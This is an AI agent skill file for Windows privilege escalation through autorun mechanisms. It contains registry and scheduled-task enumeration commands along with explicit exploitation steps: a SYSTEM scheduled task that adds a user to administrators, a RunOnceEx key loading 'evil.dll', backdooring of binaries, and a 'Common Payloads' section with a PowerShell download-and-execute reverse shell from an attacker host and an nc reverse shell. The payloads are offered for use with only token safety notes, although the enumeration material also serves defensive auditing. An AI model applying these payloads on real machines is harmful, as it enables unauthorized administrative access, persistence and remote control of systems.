---
name: windows-autorun-privilege-escalation
description: Windows privilege escalation through autorun mechanisms. Use this skill whenever you need to enumerate or exploit Windows startup persistence mechanisms for privilege escalation. Trigger this when the user mentions Windows privilege escalation, autorun, startup programs, scheduled tasks, registry persistence, Winlogon, Active Setup, BHOs, or any Windows persistence technique. Also use when analyzing Windows systems for privilege escalation vectors, reviewing autorun configurations, or investigating suspicious startup entries.
---

# Windows Autorun Privilege Escalation

This skill helps enumerate and exploit Windows autorun mechanisms for privilege escalation. Autorun persistence mechanisms execute code automatically during system boot or user logon, making them prime targets for privilege escalation when misconfigured.

## Quick Start

1. **Enumerate all autorun mechanisms** using the consolidated script
2. **Identify writable locations** in HKLM registry keys or startup folders
3. **Exploit** by placing malicious payloads or modifying existing binaries

## Enumeration Methods

### 1. WMIC Startup Commands

Check which binaries are programmed to run at startup:

```powershell
wmic startup get caption,command 2>$null
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List
```

### 2. Scheduled Tasks

Find tasks scheduled to run with SYSTEM privileges:

```powershell
# List all scheduled tasks (excluding disabled)
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"

# Find tasks running as SYSTEM
schtasks /query /fo LIST 2>$null | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt
Get-Content schtasks.txt | Select-String "SYSTEM|Task To Run" -Context 1,0

# PowerShell alternative
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Format-Table TaskName, TaskPath, State
```

**Exploitation**: Create a task that runs as SYSTEM:
```powershell
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators <username> /add"
```

### 3. Startup Folders

Binaries in Startup folders execute on user logon:

```powershell
# Common startup folder locations
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>$null
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>$null
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>$null
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>$null

# PowerShell
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

**Exploitation**: If you can write to any startup folder, place a malicious shortcut or executable there.

**Note**: Archive extraction path traversal vulnerabilities (like CVE-2025-8088 in WinRAR) can deposit payloads directly into Startup folders during decompression.

### 4. Registry Run Keys

#### Standard Run/RunOnce Keys

These execute programs at user logon (260 character limit):

```powershell
# HKLM keys (system-wide)
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce

# HKCU keys (current user)
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce

# Terminal Server keys
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
```

**Exploitation**:
- **Exploit 1**: If you can write to any HKLM Run key, add a payload that executes when another user logs in
- **Exploit 2**: If you can overwrite binaries referenced in HKLM Run keys, backdoor them

#### RunServices Keys

Control automatic service startup during boot:

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
```

#### RunOnceEx Keys

Execute commands before other Run keys (Vista+):

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx
```

**Example**: Load a DLL at startup:
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil.dll"
```

### 5. Startup Path Registry Keys

Define where Startup folders are located:

```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
```

**Exploitation**: If you can overwrite Shell Folder paths under HKLM, redirect them to a folder you control and place a backdoor there.

### 6. Winlogon Keys

Control what executes during user logon:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
```

- **Userinit**: Typically `userinit.exe` - executes at logon
- **Shell**: Typically `explorer.exe` - the default Windows shell

**Exploitation**: Modify these values or backdoor the referenced binaries to execute code at logon.

### 7. Policy Settings

Group Policy can force program execution:

```powershell
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
```

### 8. AlternateShell (Safe Mode)

Controls the shell used in Safe Mode with Command Prompt:

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
```

**Exploitation**:
- **Exploit 1**: Change AlternateShell to a custom shell
- **Exploit 2**: If you can write to PATH before `C:\Windows\system32`, create a backdoored `cmd.exe`
- **Exploit 3**: Modify `boot.ini` to auto-start Safe Mode (Windows XP)

### 9. Active Setup

Executes before desktop loads, before Run/RunOnce keys:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

**Key values**:
- **IsInstalled**: `0` = won't execute, `1` = executes once per user
- **StubPath**: The command to execute

**Exploitation**: Modify StubPath or backdoor the referenced binary.

### 10. Browser Helper Objects (BHOs)

DLLs that load into Internet Explorer and Windows Explorer:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

Each BHO has a CLSID. Find details at:
```
HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}
```

### 11. Internet Explorer Extensions

```powershell
reg query "HKLM\Software\Microsoft\Internet Explorer\Extensions" /s
reg query "HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions" /s
```

### 12. Font Drivers

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
```

### 13. Open Command (HTML Handler)

```powershell
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
```

### 14. Image File Execution Options (IFEO)

Debuggers that hijack program execution:

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## Comprehensive Enumeration

### Using Sysinternals Autoruns

For the most complete autorun enumeration:

```powershell
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

### Using winPEAS

winPEAS already searches most autorun locations:

```powershell
winPEAS.exe
```

## PowerShell Consolidated Script

Use the bundled `enumerate-autoruns.ps1` script for comprehensive enumeration:

```powershell
.\scripts\enumerate-autoruns.ps1
```

This script checks all major autorun mechanisms and outputs results to `autorun-enumeration.txt`.

## Exploitation Checklist

When you find a writable autorun location:

1. **Verify write permissions** on the registry key or folder
2. **Check if the binary path is writable** (for backdooring)
3. **Determine execution context** (SYSTEM, user, etc.)
4. **Choose payload** based on your goal (reverse shell, add user to admins, etc.)
5. **Test** by triggering the autorun (logon, reboot, etc.)
6. **Clean up** if needed

## Common Payloads

```powershell
# Add user to administrators
net localgroup administrators <username> /add

# Reverse shell (PowerShell)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/shell.ps1')"

# Reverse shell (cmd)
nc -e cmd.exe <attacker> <port>

# Create scheduled task for persistence
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "<taskname>" /TR "<payload>"
```

## Safety Notes

- **Always test in authorized environments only**
- **Document changes** for remediation
- **Some modifications require reboot** to take effect
- **HKLM changes affect all users**; HKCU affects only current user
- **Wow6432Node** indicates 64-bit Windows with 32-bit application view

## References

- [Mitre ATT&CK T1547.001 - Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)
- [Sysinternals Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)
- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
- [Microsoft Press - Autorun Locations](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
